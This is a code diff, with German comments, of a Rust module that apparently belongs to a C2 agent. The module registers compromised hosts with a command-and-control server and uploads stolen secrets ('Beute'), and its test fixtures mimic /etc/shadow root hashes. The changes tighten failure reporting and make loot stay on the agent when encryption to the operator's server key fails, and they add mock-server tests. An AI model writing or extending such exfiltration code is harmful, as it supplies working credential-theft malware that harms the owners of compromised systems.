@@ -72,11 +72,15 @@ impl Ergebnis {
 
     /// Ob der Lauf als Fehlschlag zu melden ist.
     ///
-    /// Zwei Fälle: der C2-Server war nicht erreichbar, oder Beute ging
-    /// verloren, die der Agent erfolgreich erbeutet hatte. Ein gescheiterter
-    /// Exploit ist **kein** Fehlschlag — nichts gefunden ist ein Ergebnis.
+    /// **Jede** verlorene Host-Anmeldung und jede verlorene Beute ist ein
+    /// Fehlschlag. Das umfasst die eigene Anmeldung des Agenten: der
+    /// C2-Server kennt den Agenten sonst nicht, und der Operator sieht ihn
+    /// nicht in seiner Host-Liste.
+    ///
+    /// Ein gescheiterter Exploit ist **kein** Fehlschlag — nichts gefunden ist
+    /// ein Ergebnis.
     pub fn fehlgeschlagen(&self) -> bool {
-        self.c2_nicht_erreichbar() || self.beute_verloren > 0
+        self.hosts_verloren > 0 || self.beute_verloren > 0
     }
 
     /// Zwei Ergebnisse zu einem zusammenführen.
@@ -110,8 +114,28 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
     let mut ergebnis = Ergebnis::default();
 
     for fund in funde {
-        // Je Host ein Master-Key, fuer die ganze Laufzeit.
-        let key = sealer.and_then(|s| s.schluessel_fuer(&fund.host_id));
+        // Der Operator hat Verschlüsselung verlangt: der Server-Schlüssel
+        // liegt vor. Schlägt die Kapselung für diesen Host fehl, geht die
+        // Beute **nicht** im Klartext hinaus — sie bleibt hier. Sonst würde
+        // ein Fehler in der Kryptografie stillschweigend zur Klartext-Exfiltration
+        // führen, und das Gegenteil dessen, was `exfil::upload` verspricht.
+        let key = match sealer {
+            Some(s) => match s.schluessel_fuer(&fund.host_id) {
+                Some(k) => Some(k),
+                None => {
+                    error!(
+                        "Master-Key für Host {} nicht kapselbar — die Beute bleibt hier",
+                        fund.host_id
+                    );
+                    ergebnis.beute_verloren += fund.secrets.len();
+                    continue;
+                }
+            },
+            // Kein Server-Schlüssel: die Beute geht im Klartext an den C2. Das
+            // ist der dokumentierte Normalfall eines Agenten ohne
+            // Schlüsselmaterial — hier ist es gewollt.
+            None => None,
+        };
 
         // 1. Der Host zuerst. Ohne ihn ist die Beute wertlos.
         let anfrage = RegisterRequest {
@@ -180,8 +204,12 @@ mod tests {
     struct Aufzeichner {
         /// Die Reihenfolge der Aufrufe: `host:<id>` und `beute:<host>`.
         aufrufe: Mutex<Vec<String>>,
-        /// Ob die Registrierung scheitern soll.
-        host_fehler: bool,
+        /// Die Registrierungen, so wie sie abgingen.
+        hosts: Mutex<Vec<RegisterRequest>>,
+        /// Die Uploads, so wie sie abgingen.
+        uploads: Mutex<Vec<SecretUpload>>,
+        /// Der Host, dessen Registrierung scheitern soll — `*` für alle.
+        host_fehler: Option<String>,
         /// Ob der Beute-Upload scheitern soll.
         beute_fehler: bool,
     }
@@ -190,14 +218,24 @@ mod tests {
         fn neu() -> Self {
             Aufzeichner {
                 aufrufe: Mutex::new(Vec::new()),
-                host_fehler: false,
+                hosts: Mutex::new(Vec::new()),
+                uploads: Mutex::new(Vec::new()),
+                host_fehler: None,
                 beute_fehler: false,
             }
         }
 
         fn mit_host_fehler() -> Self {
             Aufzeichner {
-                host_fehler: true,
+                host_fehler: Some("*".to_string()),
+                ..Aufzeichner::neu()
+            }
+        }
+
+        /// Nur die Registrierung dieses Hosts scheitert.
+        fn mit_host_fehler_fuer(host_id: &str) -> Self {
+            Aufzeichner {
+                host_fehler: Some(host_id.to_string()),
                 ..Aufzeichner::neu()
             }
         }
@@ -212,6 +250,14 @@ mod tests {
         fn aufrufe(&self) -> Vec<String> {
             self.aufrufe.lock().unwrap().clone()
         }
+
+        fn hosts(&self) -> Vec<RegisterRequest> {
+            self.hosts.lock().unwrap().clone()
+        }
+
+        fn uploads(&self) -> Vec<SecretUpload> {
+            self.uploads.lock().unwrap().clone()
+        }
     }
 
     impl C2Port for Aufzeichner {
@@ -220,7 +266,12 @@ mod tests {
                 .lock()
                 .unwrap()
                 .push(format!("host:{}", req.host_id));
-            if self.host_fehler {
+            self.hosts.lock().unwrap().push(req.clone());
+            let trifft_zu = self
+                .host_fehler
+                .as_ref()
+                .is_some_and(|muster| muster == "*" || muster == &req.host_id);
+            if trifft_zu {
                 return Err(TransportError::Http("kein Host".to_string()));
             }
             Ok(())
@@ -231,6 +282,7 @@ mod tests {
                 .lock()
                 .unwrap()
                 .push(format!("beute:{}", upload.host_id));
+            self.uploads.lock().unwrap().push(upload.clone());
             if self.beute_fehler {
                 return Err(TransportError::Http("keine Beute".to_string()));
             }
@@ -259,6 +311,109 @@ mod tests {
                 .map(|i| Secret::new("shadow", format!("root{i}"), "hash", "/etc/shadow"))
                 .collect(),
         }
+    }
+
+    /// Ein Versiegler mit gültigem Server-Schlüssel.
+    fn gueltiger_sealer() -> crate::hostkey::KeySealer {
+        let mut rng = rand_core::OsRng;
+        let bundle =
+            kx_core::hostkey::ServerKeyBundle::generate(kx_core::format::KexId::X25519, &mut rng);
+        let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
+        let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
+        crate::hostkey::KeySealer::from_server_key(dekodiert)
+    }
+
+    /// Ein Versiegler, dessen Kapselung **nicht** gelingen kann: der
+    /// ML-KEM-Schlüssel fehlt.
+    fn kaputter_sealer() -> crate::hostkey::KeySealer {
+        crate::hostkey::KeySealer::from_server_key(kx_core::hostkey::DecodedServerKey {
+            kex: kx_core::format::KexId::HybridX25519MlKem768,
+            x25519: vec![0u8; 32],
+            mlkem: None,
+        })
+    }
+
+    /// Mit einem Server-Schlüssel wird die Beute versiegelt gemeldet, und das
+    /// Siegel geht bei der Registrierung mit.
+    ///
+    /// Der Klartext darf **nicht** im Upload stehen — der Server würde ihn
+    /// sehen.
+    #[test]
+    fn mit_server_schluessel_ist_die_beute_versiegelt() {
+        let port = Aufzeichner::neu();
+        let sealer = gueltiger_sealer();
+        let ergebnis = melde(&port, Some(&sealer), &[fund("192.168.1.5", 2)]);
+
+        assert_eq!(ergebnis.beute_gemeldet, 2);
+        let hosts = port.hosts();
+        assert_eq!(hosts.len(), 1);
+        assert!(
+            !hosts[0]
+                .sealed_master
+                .as_deref()
+                .unwrap_or_default()
+                .is_empty(),
+            "das Siegel des Hosts fehlt in der Registrierung"
+        );
+        let uploads = port.uploads();
+        assert_eq!(uploads.len(), 2);
+        for upload in &uploads {
+            assert!(upload.password.is_empty(), "der Klartext steht im Upload");
+            assert!(
+                upload.sealed_password.is_some(),
+                "das Passwort ist nicht versiegelt"
+            );
+        }
+    }
+
+    /// Schlägt die Kapselung fehl, geht die Beute **nicht** im Klartext
+    /// hinaus.
+    ///
+    /// Der Operator hat mit `--server-key` Verschlüsselung verlangt. Ein
+    /// Fehler in der Kryptografie darf nicht stillschweigend zur
+    /// Klartext-Exfiltration führen — das Stück bleibt beim Agenten.
+    #[test]
+    fn schlaegt_die_kapselung_fehl_bleibt_die_beute_hier() {
+        let port = Aufzeichner::neu();
+        let sealer = kaputter_sealer();
+        let ergebnis = melde(&port, Some(&sealer), &[fund("192.168.1.5", 3)]);
+
+        assert!(
+            port.uploads().is_empty(),
+            "die Beute ging trotz kaputter Kryptografie raus"
+        );
+        assert_eq!(ergebnis.beute_gemeldet, 0);
+        assert_eq!(ergebnis.beute_verloren, 3);
+        assert!(ergebnis.fehlgeschlagen());
+    }
+
+    /// Ein Host ohne Beute, dessen Registrierung scheitert, ist trotzdem ein
+    /// Verlust: der C2-Server kennt ihn nicht.
+    #[test]
+    fn ein_host_ohne_beute_zaehlt_als_verloren() {
+        let port = Aufzeichner::mit_host_fehler();
+        let ergebnis = melde(&port, None, &[fund("192.168.1.5", 0)]);
+
+        assert_eq!(ergebnis.hosts_verloren, 1);
+        assert_eq!(ergebnis.beute_verloren, 0);
+        assert!(
+            ergebnis.fehlgeschlagen(),
+            "ein verlorener Host muss als Fehlschlag gelten"
+        );
+    }
+
+    /// Gemischte Ergebnisse über mehrere Hosts: der eine kommt an, der
+    /// andere nicht.
+    #[test]
+    fn gemischte_ergebnisse_ueber_mehrere_hosts() {
+        let port = Aufzeichner::mit_host_fehler_fuer("10.0.0.9");
+        let ergebnis = melde(&port, None, &[fund("10.0.0.5", 1), fund("10.0.0.9", 2)]);
+
+        assert_eq!(ergebnis.hosts_registriert, 1);
+        assert_eq!(ergebnis.hosts_verloren, 1);
+        assert_eq!(ergebnis.beute_gemeldet, 1);
+        assert_eq!(ergebnis.beute_verloren, 2);
+        assert!(ergebnis.fehlgeschlagen());
     }
 
     #[test]
